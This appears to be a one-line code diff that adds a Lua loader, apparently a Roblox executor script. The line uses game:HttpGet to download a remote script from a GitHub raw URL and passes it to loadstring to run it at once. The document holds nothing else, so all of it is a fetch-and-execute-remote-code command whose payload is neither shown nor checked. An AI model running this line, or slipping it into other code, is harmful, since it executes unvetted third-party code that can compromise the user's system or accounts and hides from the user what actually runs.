@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/andhikadaki/Cuanboys/main/73091492458229.lua"))()
